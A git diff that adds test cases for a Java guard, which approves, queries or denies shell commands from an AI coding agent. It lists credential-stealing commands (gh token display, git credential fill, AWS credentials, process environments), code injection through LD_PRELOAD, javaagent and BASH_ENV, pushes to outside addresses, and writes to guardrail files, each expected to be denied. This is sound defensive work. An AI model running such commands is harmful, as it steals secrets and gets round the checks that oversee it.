@@ -19,6 +19,9 @@ import sdlc.core.Store;
 import sdlc.core.Work;
 import sdlc.guard.Decision;
 import sdlc.guard.EnvRules;
+import sdlc.guard.Guard;
+import sdlc.util.Http;
+import sdlc.util.Json;
 import sdlc.util.Markdown;
 import sdlc.util.Proc;
 import sdlc.util.ShellWords;
@@ -209,6 +212,72 @@ final class JavaGuardTests {
         expect("hook cwd in a subfolder: relative code write", shellIn(tmp.resolve("src"), "echo x > main/java/demo/A.java"), Decision.Kind.DENY);
         expect("hook cwd in a subfolder: reading code ok", shellIn(tmp.resolve("src/main/java"), "cat demo/A.java"), Decision.Kind.ALLOW);
 
+        // the shell outside the repository: relative paths are read from out there, the rules stay this repository's
+        Path above = tmp.getParent();
+        String repo = tmp.getFileName().toString();
+        check("a folder outside the repository is kept", above.equals(Guard.folder(tmp, tmp, above.toString())));
+        expect("from above the repository: guardrail file by relative path", shellIn(above, "echo x > " + repo + "/.agent/sdlc.yml"), Decision.Kind.DENY);
+        expect("from above the repository: secret by relative path", shellIn(above, "cat " + repo + "/.agent/local.env"), Decision.Kind.DENY);
+        expect("from above the repository: code by relative path", shellIn(above, "echo x > " + repo + "/src/main/java/demo/A.java"), Decision.Kind.DENY);
+        expect("from above the repository: plain command ok", shellIn(above, "ls"), Decision.Kind.ALLOW);
+
+        // an input built to crash or stall the guard is refused, not waved through
+        expect("commands nested too deep", shell("echo " + "$(echo ".repeat(13) + "x" + ")".repeat(13)), Decision.Kind.DENY);
+        expect("commands nested a little are judged as before", shell("echo $(echo $(date))"), Decision.Kind.ASK);
+        check("json nested too deep is refused", throwsIllegal(() -> Json.parse("[".repeat(5000) + "]".repeat(5000))));
+        check("json nested a little ok", Json.parse("[[[{\"a\":[1]}]]]") != null);
+
+        // credentials through the tools that hold them
+        expect("gh token by status", shell("gh auth status --show-token"), Decision.Kind.DENY);
+        expect("gh token by status short", shell("gh auth status -t"), Decision.Kind.DENY);
+        expect("gh auth status ok", shell("gh auth status"), Decision.Kind.ALLOW);
+        expect("git credential fill", shell("git credential fill"), Decision.Kind.DENY);
+        expect("git credential helper", shell("git credential-store get"), Decision.Kind.DENY);
+        expect("gh token file", shell("cat ~/.config/gh/hosts.yml"), Decision.Kind.DENY);
+        expect("cloud credentials", shell("cat ~/.aws/credentials"), Decision.Kind.DENY);
+        expect("private key file", shell("cat deploy/server.key"), Decision.Kind.DENY);
+        expect("environment of a process", shell("cat /proc/self/environ"), Decision.Kind.DENY);
+        expect("environment of the shell", shell("cat /proc/$$/environ"), Decision.Kind.DENY);
+        expect("ps with environment", shell("ps eww"), Decision.Kind.DENY);
+        expect("ps plain ok", shell("ps -ef"), Decision.Kind.ALLOW);
+
+        // variables and options that put other code into the tools
+        expect("java agent by variable", shell("JAVA_TOOL_OPTIONS=-javaagent:/tmp/x.jar java .agent/Sdlc.java status"), Decision.Kind.DENY);
+        expect("trust store by variable", shell("export _JAVA_OPTIONS=-Djavax.net.ssl.trustStore=/tmp/t"), Decision.Kind.DENY);
+        expect("java memory by variable ok", shell("MAVEN_OPTS=-Xmx2g ./mvnw -B verify"), Decision.Kind.ALLOW);
+        expect("preloaded library", shell("LD_PRELOAD=/tmp/x.so git status"), Decision.Kind.DENY);
+        expect("shell start file", shell("BASH_ENV=/tmp/x.sh bash -c 'ls'"), Decision.Kind.DENY);
+        expect("node preload", shell("NODE_OPTIONS='--require /tmp/x.js' npm test"), Decision.Kind.DENY);
+        expect("java agent as an option of the tool", shell("java -javaagent:/tmp/x.jar .agent/Sdlc.java status"), Decision.Kind.DENY);
+        expect("another class path for the tool", shell("java -cp /tmp/fake sdlc.Main status"), Decision.Kind.DENY);
+        expect("the tool run plainly ok", shell("java .agent/Sdlc.java status"), Decision.Kind.ALLOW);
+        expect("PATH with a temp folder asks", shell("PATH=/tmp/bin:$PATH git status"), Decision.Kind.ASK);
+        expect("PATH with a repository folder asks", shell("export PATH=./tools:$PATH"), Decision.Kind.ASK);
+        expect("PATH with a JDK ok", shell("PATH=$JAVA_HOME/bin:$PATH ./mvnw -B verify"), Decision.Kind.ALLOW);
+        expect("PATH question does not hide a refusal", shell("PATH=/tmp/bin:$PATH cat .agent/local.env"), Decision.Kind.DENY);
+        expect("proxy by variable asks", shell("HTTPS_PROXY=http://127.0.0.1:8888 java .agent/Sdlc.java status"), Decision.Kind.ASK);
+
+        // git: other addresses, other trees, commands git would run
+        expect("push to an address", shell("git push https://example.com/x.git HEAD"), Decision.Kind.DENY);
+        expect("push to an ssh address", shell("git push git@example.com:x/y.git feature/PROJ-1-demo"), Decision.Kind.DENY);
+        expect("push with --repo", shell("git push --repo=https://example.com/x.git"), Decision.Kind.DENY);
+        expect("push with a receive program", shell("git push --receive-pack='sh x.sh' origin feature/PROJ-1-demo"), Decision.Kind.DENY);
+        expect("remote set-url", shell("git remote set-url origin https://example.com/x.git"), Decision.Kind.DENY);
+        expect("remote add asks", shell("git remote add fork https://example.com/x.git"), Decision.Kind.ASK);
+        expect("remote list ok", shell("git remote -v"), Decision.Kind.ALLOW);
+        expect("another git dir", shell("git --git-dir=/tmp/o/.git status"), Decision.Kind.DENY);
+        expect("another exec path", shell("git --exec-path=/tmp/bin status"), Decision.Kind.DENY);
+        expect("worktree add asks", shell("git worktree add ../wt develop"), Decision.Kind.ASK);
+        expect("rebase --exec asks", shell("git rebase -i --exec 'sh x.sh' HEAD~2"), Decision.Kind.ASK);
+        expect("rebase plain ok", shell("git rebase origin/develop"), Decision.Kind.ALLOW);
+        expect("bisect run asks", shell("git bisect run sh x.sh"), Decision.Kind.ASK);
+        expect("submodule foreach asks", shell("git submodule foreach 'sh x.sh'"), Decision.Kind.ASK);
+        expect("lfs install asks", shell("git lfs install"), Decision.Kind.ASK);
+        expect("git daemon", shell("git daemon --export-all"), Decision.Kind.DENY);
+
+        // a token never travels without encryption, and never follows a redirect elsewhere
+        check("token over plain http is refused", refuses(() -> Http.text("GET", "http://jira.example.com/rest/api/2/myself", "Bearer t", null, "application/json"), "without encryption"));
+
         expect("edit guardrail", tool("create_file", "{\"filePath\":\"" + tmp + "/.github/hooks/guardrails.json\"}"), Decision.Kind.DENY);
         expect("edit state", tool("edit", "{\"path\":\".sdlc/PROJ-1/state.json\"}"), Decision.Kind.DENY);
         expect("edit draft ok", tool("create_file", "{\"filePath\":\"" + tmp + "/.sdlc/PROJ-1/drafts/lld.md\"}"), Decision.Kind.ALLOW);
@@ -350,5 +419,24 @@ final class JavaGuardTests {
         List<String> trace = Trace.problems("PROJ-1");
         check("trace finds the missing test only", trace.size() == 1 && trace.get(0).startsWith("TS-02"));
         Store.write(Ctx.work("current.json"), Store.map());
+    }
+
+    private static boolean throwsIllegal(Runnable r) {
+        try {
+            r.run();
+            return false;
+        } catch (IllegalArgumentException e) {
+            return true;
+        }
+    }
+
+    /** True when the call is refused with a message that holds the words. */
+    private static boolean refuses(Runnable call, String words) {
+        try {
+            call.run();
+            return false;
+        } catch (Http.ApiException e) {
+            return e.getMessage().contains(words);
+        }
     }
 }
